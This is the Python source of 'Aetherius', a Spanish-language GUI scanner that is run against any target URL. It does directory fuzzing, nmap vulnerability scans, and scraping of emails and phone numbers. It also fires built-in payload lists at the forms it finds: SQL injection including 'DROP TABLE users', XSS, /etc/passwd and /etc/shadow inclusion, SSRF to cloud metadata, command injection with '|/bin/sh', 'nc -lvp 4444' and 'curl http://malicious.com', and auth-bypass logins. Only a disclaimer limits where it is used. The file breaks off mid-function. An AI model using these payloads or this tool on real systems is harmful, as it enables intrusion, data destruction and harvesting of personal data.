import requests
from bs4 import BeautifulSoup
from bs4.element import Comment
import subprocess
import re
import urllib.parse
import os
import customtkinter as ctk
import threading
import queue
import sys
from concurrent.futures import ThreadPoolExecutor
import datetime
from PIL import Image
from PyPDF2 import PdfReader
import io
import validators

ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("dark-blue")

ascii_art = """
          .                                                      .
        .n                   .                 .                  n.
  .   .dP                  dP                   9b                 9b.    .
 4    qXb         .       dX                     Xb       .        dXp     t
dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb
9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP
 9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP
  `9XXXXXXXXXXXXXXXXXXXXX'~   ~`OOO8b   d8OOO'~   ~`XXXXXXXXXXXXXXXXXXXXXP'
    `9XXXXXXXXXXXP' `9XX'   DIE    `98v8P'  HUMAN   `XXP' `9XXXXXXXXXXXP'
        ~~~~~~~       9X.          .db|db.          .XP       ~~~~~~~
                        )b.  .dbo.dP'`v'`9b.odb.  .dX(
                      ,dXXXXXXXXXXXb     dXXXXXXXXXXXb.
                     dXXXXXXXXXXXP'   .   `9XXXXXXXXXXXb
                    dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
                    9XXb'   `XXXXXb.dX|Xb.dXXXXX'   `dXXP
                     `'      9XXXXXX(   )XXXXXXP      `'
                              XXXX X.`v'.X XXXX
                              XP^X'`b   d'`X^XX
                              X. 9  `   '  P )X
                              `b  `       '  d'
                               `             '
  ___       _   _               _                  _   __                _             
 / _ \     | | | |             (_)                | | / /               (_)            
/ /_\ \ ___| |_| |__   ___ _ __ _ _   _ ___ ______| |/ / _ __ __ _ _ __  _  ___  _ __  
|  _  |/ _ \ __| '_ \ / _ \ '__| | | | / __|______|    \| '__/ _` | '_ \| |/ _ \| '_ \ 
| | | |  __/ |_| | | |  __/ |  | | |_| \__ \      | |\  \ | | (_| | | | | | (_) | | | |
\_| |_/\___|\__|_| |_|____|_|  |_|____|____/      \_| \_/_|  \__,_|_| |_|_|\___/|_| |_|

herramienta de seguridad,los creadores del script del grupo error-403
no nos hacemos responsables por el mal uso del script,favor de solo usarlo
en sus propios servicios                                                                                                                           ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
"""
print(ascii_art)
report_content = []

def add_to_report(title, content, log_func):
    """Añade un hallazgo al reporte final."""
    global report_content
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    report_content.append(f"### {title}\n\n- Fecha y Hora: {timestamp}\n{content}\n")
    log_func(f"\n[+] Nuevo hallazgo añadido al reporte: {title}")

def save_report_to_file(target_url, log_func):
    """Guarda todo el reporte en un archivo de texto."""
    global report_content
    filename = f"reporte_seguridad_{target_url.replace('http://', '').replace('https://', '').replace('/', '_')}.md"

    header = f"# Reporte de Seguridad - {target_url}\n\n"
    header += f"Fecha del Escaneo: {datetime.datetime.now().strftime('%Y-%m-%d')}\n"
    header += f"Realizado por: Aetherius Script\n\n"
    header += "---\n\n"

    try:
        with open(filename, "w", encoding='utf-8') as file:
            file.write(header)
            for item in report_content:
                file.write(item)
        log_func(f"\n[+] Reporte de seguridad guardado en '{filename}'")
        report_content = []  # Limpiar el reporte para el próximo escaneo
    except Exception as e:
        log_func(f"[!] Error al guardar el reporte: {e}")

class App(ctk.CTk):
    def __init__(self):
        super().__init__()

        self.title("Aetherius")
        self.geometry("1200x800")
        self.grid_rowconfigure(2, weight=1)
        self.grid_columnconfigure(0, weight=1)

        try:
            mono_font = ctk.CTkFont(family="Consolas")
        except:
            mono_font = ctk.CTkFont(family="Courier New")

        # Título y campo de entrada de URL en la parte superior
        self.header_frame = ctk.CTkFrame(self, corner_radius=0)
        self.header_frame.grid(row=0, column=0, sticky="ew", padx=20, pady=(20, 10))
        self.header_frame.grid_columnconfigure(0, weight=1)

        self.logo_label = ctk.CTkLabel(self.header_frame, text="Aetherius", font=ctk.CTkFont(size=28, weight="bold"))
        self.logo_label.grid(row=0, column=0, sticky="w", padx=10, pady=(10, 5))

        self.url_entry = ctk.CTkEntry(self.header_frame, placeholder_text="Ingrese la URL objetivo (ej. https://ejemplo.com)", width=500)
        self.url_entry.grid(row=0, column=1, sticky="ew", padx=10, pady=(10, 5))

        # Panel para los botones de las opciones
        self.buttons_frame = ctk.CTkFrame(self, corner_radius=0)
        self.buttons_frame.grid(row=1, column=0, sticky="ew", padx=20, pady=5)
        self.buttons_frame.grid_columnconfigure((0, 1, 2, 3, 4, 5, 6, 7), weight=1)

        self.complete_scan_button = ctk.CTkButton(self.buttons_frame, text="Completo", command=lambda: self.start_scan("Escaneo Completo"))
        self.complete_scan_button.grid(row=0, column=0, padx=5, pady=5, sticky="ew")

        self.html_scan_button = ctk.CTkButton(self.buttons_frame, text="HTML", command=lambda: self.start_scan("HTML"))
        self.html_scan_button.grid(row=0, column=1, padx=5, pady=5, sticky="ew")

        self.fuzz_scan_button = ctk.CTkButton(self.buttons_frame, text="Fuzzing", command=lambda: self.start_scan("Fuzzing"))
        self.fuzz_scan_button.grid(row=0, column=2, padx=5, pady=5, sticky="ew")

        self.headers_scan_button = ctk.CTkButton(self.buttons_frame, text="Headers", command=lambda: self.start_scan("Headers"))
        self.headers_scan_button.grid(row=0, column=3, padx=5, pady=5, sticky="ew")

        self.nmap_scan_button = ctk.CTkButton(self.buttons_frame, text="Nmap", command=lambda: self.start_scan("Nmap"))
        self.nmap_scan_button.grid(row=0, column=4, padx=5, pady=5, sticky="ew")

        self.osint_scan_button = ctk.CTkButton(self.buttons_frame, text="OSINT", command=lambda: self.start_scan("OSINT"))
        self.osint_scan_button.grid(row=0, column=5, padx=5, pady=5, sticky="ew")

        self.robots_scan_button = ctk.CTkButton(self.buttons_frame, text="OSINT Avanzado", command=lambda: self.start_scan("OSINT Avanzado"))
        self.robots_scan_button.grid(row=0, column=6, padx=5, pady=5, sticky="ew")

        self.vuln_scan_button = ctk.CTkButton(self.buttons_frame, text="Vulnerabilidades", command=lambda: self.start_scan("Vulnerabilidades"))
        self.vuln_scan_button.grid(row=0, column=7, padx=5, pady=5, sticky="ew")

        self.clear_button = ctk.CTkButton(self.buttons_frame, text="Borrar", command=self.clear_output)
        self.clear_button.grid(row=0, column=8, padx=5, pady=5, sticky="ew")

        # Panel principal para el reporte de salida
        self.report_frame = ctk.CTkFrame(self, corner_radius=0)
        self.report_frame.grid(row=2, column=0, sticky="nsew", padx=20, pady=10)
        self.report_frame.grid_columnconfigure(0, weight=1)
        self.report_frame.grid_rowconfigure(0, weight=1)

        self.scan_output = ctk.CTkTextbox(self.report_frame, font=mono_font, wrap="none")
        self.scan_output.grid(row=0, column=0, sticky="nsew", padx=10, pady=10)

        self.scrollbar = ctk.CTkScrollbar(self.report_frame, command=self.scan_output.yview)
        self.scrollbar.grid(row=0, column=1, sticky="ns", padx=(0, 10), pady=10)
        self.scan_output.configure(yscrollcommand=self.scrollbar.set)

        # Cola para la salida en segundo plano
        self.queue = queue.Queue()
        self.update_log()

    def update_log(self):
        """Actualiza la salida en pantalla desde la cola."""
        while not self.queue.empty():
            line = self.queue.get_nowait()
            self.scan_output.insert(ctk.END, line)
            self.scan_output.see(ctk.END)
        self.after(100, self.update_log)

    def log(self, text):
        """Añade texto a la cola de salida."""
        self.queue.put(text + "\n")

    def clear_output(self):
        """Limpia la salida en pantalla."""
        self.scan_output.delete("1.0", ctk.END)
        self.log("Reporte borrado.")

    def start_scan(self, scan_type):
        """Inicia el escaneo en un hilo separado."""
        target_url = self.url_entry.get().strip()
        if not target_url:
            self.log("Por favor, ingresa una URL.")
            return
        if not validators.url(target_url):
            self.log("Error: La URL ingresada no es válida. Asegúrate de incluir el protocolo (http:// o https://).")
            return

        # Limpiar reporte para un nuevo escaneo
        global report_content
        report_content = []

        self.log("=" * 50)
        self.log(f"Iniciando escaneo: {scan_type}")
        self.log("=" * 50)
        self.log("")

        thread = threading.Thread(target=self.run_scan, args=(scan_type, target_url))
        thread.start()

    def run_scan(self, scan_type, target_url):
        """Ejecuta el escaneo según el tipo seleccionado."""
        # Asegurarse de que la URL tenga protocolo para Nmap
        if not target_url.startswith(('http://', 'https://')):
            target_url = f"https://{target_url}"
        parsed_url = urllib.parse.urlparse(target_url)
        hostname = parsed_url.netloc or parsed_url.path  # Usar path si netloc está vacío

        diccionario_directorios = [
            "admin", "login", "panel", "user", "dashboard", "settings", "config", "backup", "upload", "download",
            "api", "webmail", "phpmyadmin", "cgi-bin", "test", "dev", "stage", "tmp", "logs", "include",
            "lib", "src", "vendor", "public", "private", "protected", "cache", "session", "tmp", "uploads",
            "downloads", "images", "scripts", "styles", "js", "css", "fonts", "robots.txt", "sitemap.xml",
            "crossdomain.xml", "favicon.ico", "wp-admin", "wp-content", "wp-includes", "wp-config.php",
            "wp-login.php", "wp-signup.php", "wp-cron.php", "wp-trackback.php", "wp-comments-post.php",
            "wp-mail.php", "wp-settings.php", "wp-load.php", "wp-blog-header.php", "wp-links-opml.php",
            "wp-atom.php", "wp-rdf.php", "wp-rss.php", "wp-rss2.php", "wp-feed.php", "wp-commentsrss2.php",
            "wp-app.php", "wp-embed.php", "wp-json", "xmlrpc.php", "license.txt", "readme.html",
            ".git/config", ".env", "config.ini", "web.config", "database.sql", "dump.sql"
        ]

        if scan_type == "Escaneo Completo":
            self.log("Iniciando escaneo completo...")
            self.log("")

            self.log("Iniciando escaneo de directorios HTML...")
            get_directories_from_html(target_url, self.log)
            self.log("Escaneo HTML finalizado.")
            self.log("")

            self.log("Iniciando fuzzing de directorios...")
            fuzz_url(target_url, diccionario_directorios, self.log)
            self.log("Fuzzing finalizado.")
            self.log("")

            self.log("Iniciando detección de encabezados HTTP...")
            detect_http_headers(target_url, self.log)
            self.log("Detección de encabezados finalizada.")
            self.log("")

            self.log("Iniciando escaneo con Nmap...")
            run_nmap_scan(hostname, self.log)
            self.log("Escaneo con Nmap finalizado.")
            self.log("")

            self.log("Iniciando análisis OSINT...")
            osint_analysis(target_url, self.log)
            self.log("Análisis OSINT finalizado.")
            self.log("")

            self.log("Iniciando análisis OSINT avanzado...")
            analyze_robots_and_sitemap(target_url, self.log)
            enumerate_subdomains(target_url, self.log)
            extract_metadata_from_page(target_url, self.log)
            self.log("Análisis OSINT avanzado finalizado.")
            self.log("")

            self.log("Iniciando búsqueda de vulnerabilidades web...")
            vulnerability_scan(target_url, self.log)
            self.log("Búsqueda de vulnerabilidades finalizada.")
            self.log("")

            self.log("Análisis completado. Generando reporte...")
            save_report_to_file(target_url, self.log)

        elif scan_type == "HTML":
            self.log("Iniciando escaneo de directorios HTML...")
            get_directories_from_html(target_url, self.log)
            self.log("Escaneo HTML finalizado.")
            self.log("Análisis completado. Generando reporte...")
            save_report_to_file(target_url, self.log)

        elif scan_type == "Fuzzing":
            self.log("Iniciando fuzzing de directorios...")
            fuzz_url(target_url, diccionario_directorios, self.log)
            self.log("Fuzzing finalizado.")
            self.log("Análisis completado. Generando reporte...")
            save_report_to_file(target_url, self.log)

        elif scan_type == "Headers":
            self.log("Iniciando detección de encabezados HTTP...")
            detect_http_headers(target_url, self.log)
            self.log("Detección de encabezados finalizada.")
            self.log("Análisis completado. Generando reporte...")
            save_report_to_file(target_url, self.log)

        elif scan_type == "Nmap":
            self.log("Iniciando escaneo con Nmap...")
            run_nmap_scan(hostname, self.log)
            self.log("Escaneo con Nmap finalizado.")
            self.log("Análisis completado. Generando reporte...")
            save_report_to_file(target_url, self.log)

        elif scan_type == "OSINT":
            self.log("Iniciando análisis OSINT...")
            osint_analysis(target_url, self.log)
            self.log("Análisis OSINT finalizado.")
            self.log("Análisis completado. Generando reporte...")
            save_report_to_file(target_url, self.log)

        elif scan_type == "OSINT Avanzado":
            self.log("Iniciando análisis OSINT avanzado...")
            analyze_robots_and_sitemap(target_url, self.log)
            enumerate_subdomains(target_url, self.log)
            extract_metadata_from_page(target_url, self.log)
            self.log("Análisis OSINT avanzado finalizado.")
            self.log("Análisis completado. Generando reporte...")
            save_report_to_file(target_url, self.log)

        elif scan_type == "Vulnerabilidades":
            self.log("Iniciando búsqueda de vulnerabilidades web...")
            forms = vulnerability_scan(target_url, self.log)
            if forms:
                self.log("\n--- Resultados de vulnerabilidades ---")
                for form in forms:
                    self.log(f"\nFormulario encontrado en {urllib.parse.urljoin(target_url, form['action'])}:")
                    self.log(f"  Método: {form['method']}")
                    self.log("  Entradas:")
                    for input_field in form['inputs']:
                        self.log(f"    - Nombre: {input_field['name']}, Tipo: {input_field['type']}, Placeholder: {input_field['placeholder']}")
                    self.log(f"  Token CSRF presente: {'Sí' if form['csrf_token'] else 'No'}")
            else:
                self.log("No se encontraron formularios o vulnerabilidades.")
            self.log("Búsqueda de vulnerabilidades finalizada.")
            self.log("Análisis completado. Generando reporte...")
            save_report_to_file(target_url, self.log)

def fuzz_url(target_url, directories, log_func):
    """Realiza fuzzing de directorios en la URL objetivo."""
    log_func(f"\n--- Iniciando Fuzzing en {target_url} ---")
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'}

    for directory in directories:
        url = f"{target_url.rstrip('/')}/{directory}"
        try:
            response = requests.get(url, timeout=5, headers=headers)
            if response.status_code == 200:
                log_func(f"[+] Encontrado: {url} (Código de estado: {response.status_code})")
                content = f"- **URL:** {url}\n"
                content += f"- **Código de estado:** {response.status_code}\n"
                content += "- **Descripción:** Se encontró un archivo o directorio de interés. Esto podría exponer información sensible o configuraciones del servidor.\n"
                content += "- **Recomendación:** Eliminar archivos innecesarios del servidor y restringir el acceso a directorios sensibles. Considerar la implementación de un firewall de aplicación web (WAF) para bloquear accesos no autorizados."
                add_to_report("Archivo/Directorio de Interés Encontrado", content, log_func)
            elif response.status_code == 403:
                log_func(f"[!] Prohibido: {url} (Código de estado: {response.status_code})")
            elif response.status_code != 404:
                log_func(f"[?] Desconocido: {url} (Código de estado: {response.status_code})")
        except requests.exceptions.RequestException as e:
            log_func(f"[!] Error al acceder a {url}: {e}")

def get_directories_from_html(target_url, log_func):
    """Busca directorios en el HTML de la página."""
    log_func(f"\n--- Analizando HTML de {target_url} ---")
    try:
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'}
        respuesta = requests.get(target_url, timeout=10, headers=headers)
        respuesta.raise_for_status()
        soup = BeautifulSoup(respuesta.text, 'html.parser')

        log_func("\n--- Directorios encontrados en el HTML ---")
        found_links = False
        tags_to_check = [('link', 'href'), ('a', 'href'), ('img', 'src'), ('script', 'src')]

        for tag_name, attr_name in tags_to_check:
            for tag in soup.find_all(tag_name):
                if tag.has_attr(attr_name):
                    link = tag[attr_name]
                    if link.startswith('/') or urllib.parse.urljoin(target_url, link) == link:
                        log_func(f"Directorio encontrado: {link}")
                        found_links = True

        if not found_links:
            log_func("No se encontraron directorios en el HTML de la página.")

    except requests.exceptions.RequestException as e:
        log_func(f"[!] Error al analizar HTML: {e}")

def detect_http_headers(target_url, log_func):
    """Detecta encabezados HTTP y analiza su seguridad."""
    log_func("\n--- Detectando encabezados HTTP ---")
    try:
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'}
        respuesta = requests.get(target_url, timeout=10, headers=headers)
        respuesta.raise_for_status()

        headers_info = []
        for key, value in respuesta.headers.items():
            headers_info.append(f"  - {key}: {value}")

        server_info = respuesta.headers.get('Server', 'No encontrado')
        headers_info.append(f"\nServidor detectado: {server_info}")

        log_func("\n".join(headers_info))

        # Analizar encabezados de seguridad
        security_headers = {
            "Content-Security-Policy": "Falta o es inseguro",
            "Strict-Transport-Security": "Falta o es inseguro",
            "X-Content-Type-Options": "Falta o es inseguro",
            "X-Frame-Options": "Falta o es inseguro"
        }

        for header, description in security_headers.items():
            if header not in respuesta.headers:
                content = f"- **Encabezado faltante:** `{header}`\n"
                content += "- **Descripción:** Este encabezado de seguridad crucial no está presente o está configurado incorrectamente.\n"
                content += f"- **Impacto:** Puede dejar la página expuesta a ataques como **Cross-Site Scripting (XSS)**, **Clickjacking** o **man-in-the-middle**.\n"
                content += f"- **Recomendación:** Implementar el encabezado de seguridad `{header}` con una configuración estricta para mitigar estos riesgos. Por ejemplo, `X-Frame-Options: DENY`."
                add_to_report("Encabezado de Seguridad Faltante", content, log_func)

    except requests.exceptions.RequestException as e:
        log_func(f"[!] Error al detectar encabezados: {e}")

import socket

def run_nmap_scan(url, log_func):
    """Ejecuta un escaneo con Nmap."""
    log_func(f"\n--- Iniciando escaneo de Nmap en {url} ---")
    try:
        # Asegurarse de que la URL tenga protocolo
        if not url.startswith(('http://', 'https://')):
            url = f"https://{url}"
        parsed_url = urllib.parse.urlparse(url)
        target = parsed_url.hostname or parsed_url.path.split('/')[0]

        if not target or '.' not in target:
            log_func(f"[!] Error: No se pudo extraer un nombre de host válido de la URL '{url}'. Asegúrate de que sea un dominio válido (ej. example.com).")
            return

        # Verificar resolución DNS
        try:
            ip_address = socket.gethostbyname(target)
            log_func(f"[*] Hostname extraído: {target} (IP: {ip_address})")
        except socket.gaierror:
            log_func(f"[!] Error: No se pudo resolver el dominio '{target}'. Verifica la conexión DNS o la validez del dominio.")
            return

        # Usar la IP resuelta para Nmap en lugar del dominio
        command = [
            'nmap', '-sV','-Pn',
            '--script', 'vuln,http-enum,http-methods,http-waf-detect',
            '--min-rate', '5000',
            ip_address  # Usar la IP en lugar del dominio
        ]

        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, bufsize=1)

        output_lines = []
        while True:
            output = process.stdout.readline()
            if output == '' and process.poll() is not None:
                break
            if output:
                output_lines.append(output.strip())
                log_func(output.strip())

        nmap_output = "\n".join(output_lines)

        vulnerabilities = re.findall(r"VULNERABLE", nmap_output, re.IGNORECASE)
        if vulnerabilities:
            content = f"- **URL:** {url}\n"
            content += f"- **IP:** {ip_address}\n"
            content += "- **Descripción:** Nmap detectó posibles vulnerabilidades en el servidor o en los servicios expuestos.\n"
            content += "- **Impacto:** Un atacante podría explotar estas vulnerabilidades para comprometer el servidor.\n"
            content += "- **Recomendación:** Investigar las vulnerabilidades detectadas y aplicar las actualizaciones de seguridad o parches necesarios."
            add_to_report("Vulnerabilidad detectada con Nmap", content, log_func)

        error_output = process.stderr.read()
        if error_output:
            log_func(f"\n--- Errores de Nmap ---")
            log_func(error_output)

    except FileNotFoundError:
        log_func("[!] Error: Nmap no está instalado o no se encuentra en el PATH del sistema.")
    except Exception as e:
        log_func(f"[!] Error inesperado al ejecutar Nmap: {e}")
        
def osint_analysis(url, log_func):
    """Realiza análisis OSINT (correos, números de teléfono, metadatos, redes sociales, comentarios)."""
    try:
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'}
        response = requests.get(url, timeout=10, headers=headers)
        response.raise_for_status()
        page_content = response.text
        soup = BeautifulSoup(page_content, 'html.parser')

        # Búsqueda de correos electrónicos
        log_func("\n[*] Buscando correos electrónicos...")
        email_pattern = r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
        emails = set()
        # Buscar en el contenido de la página
        emails.update(re.findall(email_pattern, page_content))
        # Buscar en atributos HTML
        for tag in soup.find_all(True):
            for attr in tag.attrs.values():
                if isinstance(attr, str):
                    emails.update(re.findall(email_pattern, attr))
        # Buscar en scripts externos
        for script in soup.find_all('script', src=True):
            script_url = urllib.parse.urljoin(url, script['src'])
            try:
                script_response = requests.get(script_url, timeout=5, headers=headers)
                emails.update(re.findall(email_pattern, script_response.text))
            except requests.RequestException:
                continue

        emails = list(emails)
        gmail_emails = [email for email in emails if 'gmail.com' in email.lower()]
        if emails:
            log_func(f"[+] Correos electrónicos encontrados: {emails}")
            content = f"- **URL:** {url}\n"
            content += "- **Correos encontrados:**\n"
            for email in emails:
                content += f"  - {email}\n"
            content += "- **Descripción:** Se encontraron correos electrónicos en la página, los cuales podrían ser utilizados para campañas de phishing o ingeniería social.\n"
            content += "- **Recomendación:** Evitar exponer correos electrónicos en páginas públicas. Usar formularios de contacto protegidos con CAPTCHA.\n"
            add_to_report("Correos Electrónicos Expuestos", content, log_func)
        else:
            log_func("[-] No se encontraron correos electrónicos.")

        if gmail_emails:
            log_func(f"[+] Correos Gmail específicos encontrados: {gmail_emails}")
            content = f"- **URL:** {url}\n"
            content += "- **Correos Gmail encontrados:**\n"
            for email in gmail_emails:
                content += f"  - {email}\n"
            content += "- **Descripción:** Los correos Gmail expuestos son particularmente sensibles, ya que pueden estar vinculados a cuentas personales o profesionales.\n"
            content += "- **Recomendación:** Proteger los correos expuestos y considerar el uso de direcciones de correo corporativas en lugar de personales.\n"
            add_to_report("Correos Gmail Expuestos", content, log_func)

        # Búsqueda de números de teléfono
        log_func("\n[*] Buscando números de teléfono...")
        phone_pattern = r'(?:(?:\+?\d{1,3}[-.\s]?)?(?:\(?\d{2,3}\)?[-.\s]?)?\d{3,4}[-.\s]?\d{4}(?=\s|$|[^\d]))'
        phones = set()
        # Buscar en el contenido de la página
        phones.update(re.findall(phone_pattern, page_content))
        # Buscar en atributos HTML
        for tag in soup.find_all(True):
            for attr in tag.attrs.values():
                if isinstance(attr, str):
                    phones.update(re.findall(phone_pattern, attr))
        # Buscar en scripts externos
        for script in soup.find_all('script', src=True):
            script_url = urllib.parse.urljoin(url, script['src'])
            try:
                script_response = requests.get(script_url, timeout=5, headers=headers)
                phones.update(re.findall(phone_pattern, script_response.text))
            except requests.RequestException:
                continue

        # Filtrar números de teléfono válidos (mínimo 10 dígitos)
        filtered_phones = [phone for phone in phones if len(re.sub(r'\D', '', phone)) >= 10]
        if filtered_phones:
            log_func(f"[+] Números de teléfono encontrados: {filtered_phones}")
            content = f"- **URL:** {url}\n"
            content += "- **Números de teléfono encontrados:**\n"
            for phone in filtered_phones:
                content += f"  - {phone}\n"
            content += "- **Descripción:** Los números de teléfono expuestos pueden ser utilizados para ataques de ingeniería social o spam.\n"
            content += "- **Recomendación:** Ocultar números de teléfono en el sitio web o usar formularios seguros para contacto.\n"
            add_to_report("Números de Teléfono Expuestos", content, log_func)
        else:
            log_func("[-] No se encontraron números de teléfono.")

        # Búsqueda de datos ocultos en comentarios HTML
        log_func("\n[*] Buscando datos ocultos en comentarios HTML...")
        comments = soup.find_all(string=lambda text: isinstance(text, Comment))
        hidden_data = []
        for comment in comments:
            hidden_emails = re.findall(email_pattern, comment)
            hidden_phones = re.findall(phone_pattern, comment)
            if hidden_emails or hidden_phones:
                hidden_data.append(comment)

        if hidden_data:
            log_func(f"[+] Datos ocultos encontrados en comentarios HTML: {hidden_data}")
            content = f"- **URL:** {url}\n"
            content += "- **Datos ocultos encontrados:**\n"
            for data in hidden_data:
                content += f"  - {data}\n"
            content += "- **Descripción:** Se encontraron datos sensibles en comentarios HTML, que podrían ser explotados por atacantes.\n"
            content += "- **Recomendación:** Eliminar comentarios con información sensible del código fuente.\n"
            add_to_report("Datos Ocultos en Comentarios HTML", content, log_func)
        else:
            log_func("[-] No se encontraron datos ocultos en comentarios HTML.")

        # Búsqueda de enlaces a redes sociales
        log_func("\n[*] Buscando enlaces a redes sociales...")
        social_patterns = r'(facebook\.com|twitter\.com|instagram\.com|linkedin\.com|youtube\.com)/([a-zA-Z0-9_.-]+)'
        social_links = re.findall(social_patterns, page_content)
        if social_links:
            log_func(f"[+] Enlaces a redes sociales encontrados: {social_links}")
            content = f"- **URL:** {url}\n"
            content += "- **Enlaces a redes sociales encontrados:**\n"
            for platform, handle in social_links:
                content += f"  - {platform}: {handle}\n"
            content += "- **Descripción:** Los enlaces a redes sociales pueden exponer perfiles asociados con datos adicionales.\n"
            content += "- **Recomendación:** Verificar la privacidad de los perfiles sociales vinculados y evitar exponer handles sensibles.\n"
            add_to_report("Enlaces a Redes Sociales Expuestos", content, log_func)
        else:
            log_func("[-] No se encontraron enlaces a redes sociales.")

    except requests.RequestException as e:
        log_func(f"[!] Error al obtener la página: {e}")
    except Exception as e:
        log_func(f"[!] Error inesperado en análisis OSINT: {e}")

def vulnerability_scan(url, log_func):
    """Realiza pruebas de vulnerabilidades web."""
    try:
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'}
        response = requests.get(url, timeout=10, headers=headers)
        response.raise_for_status()
        soup = BeautifulSoup(response.text, 'html.parser')

        # Análisis de formularios y parámetros de URL
        log_func("\n[*] Analizando formularios y parámetros de URL...")
        forms = []
        for form in soup.find_all('form'):
            form_info = {
                'action': form.get('action', ''),
                'method': form.get('method', '').upper(),
                'inputs': [{'name': input_.get('name', ''),
                            'type': input_.get('type', ''),
                            'placeholder': input_.get('placeholder', '')}
                           for input_ in form.find_all(['input', 'textarea', 'select'])],
                'csrf_token': bool(form.find('input', {'type': 'hidden', 'name': re.compile(r'csrf|token', re.I)}))
            }
            forms.append(form_info)

        # Extraer parámetros de URL para pruebas GET
        parsed_url = urllib.parse.urlparse(url)
        query_params = urllib.parse.parse_qs(parsed_url.query)
        url_params = [{'name': param, 'type': 'url_param', 'placeholder': ''} for param in query_params.keys()]

        # Combinar formularios y parámetros de URL
        all_inputs = []
        for form in forms:
            all_inputs.append({
                'url': urllib.parse.urljoin(url, form['action']),
                'method': form['method'],
                'inputs': form['inputs'],
                'csrf_token': form['csrf_token']
            })
        if url_params:
            all_inputs.append({
                'url': url,
                'method': 'GET',
                'inputs': url_params,
                'csrf_token': False
            })

        # Lista de payloads para pruebas de vulnerabilidades
        sql_payloads = [
            "' OR '1'='1", "1' OR '1'='1'--", "') OR ('1'='1')", "1; DROP TABLE users--",
            "' UNION SELECT NULL, NULL--", "' OR '1'='1' /*", "1' OR SLEEP(5)--",
            "1' OR BENCHMARK(1000000,MD5(1))--", "1' OR 1=1#", "1' UNION SELECT @@version--",
            "1' OR EXISTS(SELECT * FROM users)--", "1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
            "1' AND SLEEP(5)--", "1' OR 'a'='a", "1' OR 1=1 LIMIT 1--"
        ]
        xss_payloads = [
            "<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>", "<body onload=alert('XSS')>",
            "'';!--\"<XSS>=&{()}", "<iframe src=javascript:alert('XSS')>",
            "<input type=\"text\" value=\"<script>alert('XSS')</script>\">",
            "<script>document.write('XSS')</script>", "<a href=\"javascript:alert('XSS')\">Click</a>",
            "<img src=\"javascript:alert('XSS')\">", "onerror=alert('XSS')",
            "<script src=\"http://malicious.com/xss.js\"></script>", "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('XSS')\">",
            "<object data=\"javascript:alert('XSS')\"></object>", "<div style=\"background-image: url(javascript:alert('XSS'));\"></div>"
        ]
        lfi_rfi_payloads = [
            "../../etc/passwd", "../etc/passwd", "/etc/passwd", "http://malicious.com/shell.txt",
            "php://filter/convert.base64-encode/resource=index.php", "../../../../../../etc/shadow",
            "../config.php", "file:///etc/passwd", "../../../../../etc/passwd%00",
            "php://input", "expect://id", "data://text/plain,<?php phpinfo(); ?>",
            "../../wp-config.php", "../.htaccess", "file://localhost/etc/passwd"
        ]
        ssrf_payloads = [
            "http://169.254.169.254/latest/meta-data/", "http://127.0.0.1:8080/",
            "http://example.com:80", "http://localhost:80/", "http://10.0.0.1/",
            "http://172.16.0.1/", "http://192.168.0.1/", "http://[::1]/",
            "file://localhost/etc/passwd", "gopher://127.0.0.1:6379/_INFO",
            "http://internal.example.com/admin", "dict://127.0.0.1:11211/stat"
        ]
        command_injection_payloads = [
            ";id", "|whoami", "&&cat /etc/passwd", ";ls -la", "|/bin/sh",
            "$(id)", "`whoami`", ";ping -c 1 127.0.0.1", "||id", "&id",
            ";sleep 5", "|nc -lvp 4444", ";curl http://malicious.com"
        ]
        auth_bypass_payloads = [
            {"username": "admin", "password": "' OR '1'='1"}, {"username": "admin' --", "password": ""},
            {"username": "admin' #", "password": ""}, {"username": "' OR ''='", "password": "' OR ''='"},
            {"username": "admin", "password": "admin"}, {"username": "test", "password": "test"}
        ]

        # Pruebas de vulnerabilidades
        for input_set in all_inputs:
            target_url = input_set['url']
            method = input_set['method']
            inputs = input_set['inputs']
            csrf_token = input_set['csrf_token']

            log_func(f"\n[*] Probando vulnerabilidades en {target_url} (Método: {method})")

            for input_field in inputs:
                input_name = input_field.get('name')
                if not input_name:
                    continue

                # Inyección SQL
                log_func(f"[*] Probando Inyección SQL en parámetro: {input_name}")
                for payload in sql_payloads:
                    if test_vulnerability(target_url, method, {input_name: payload}, "SQL Injection", log_func):
                        content = f"- **URL:** {target_url}\n"
                        content += f"- **Parámetro afectado:** `{input_name}`\n"
                        content += f"- **Payload:** `{payload}`\n"
                        content += "- **Descripción:** El servidor respondió de forma inesperada al inyectar un payload de SQL, lo que indica una posible vulnerabilidad de inyección SQL.\n"
                        content += "- **Impacto:** Un atacante podría obtener, modificar o eliminar datos de la base de datos, o incluso obtener control del servidor.\n"
                        content += "- **Recomendación:** Implementar consultas parametrizadas o sentencias preparadas. Sanitizar y validar toda la entrada del usuario."
                        log_func(f"\n[!] Vulnerabilidad encontrada: Inyección SQL")
                        log_func(content)
                        add_to_report("Vulnerabilidad de Inyección SQL", content, log_func)

                # XSS
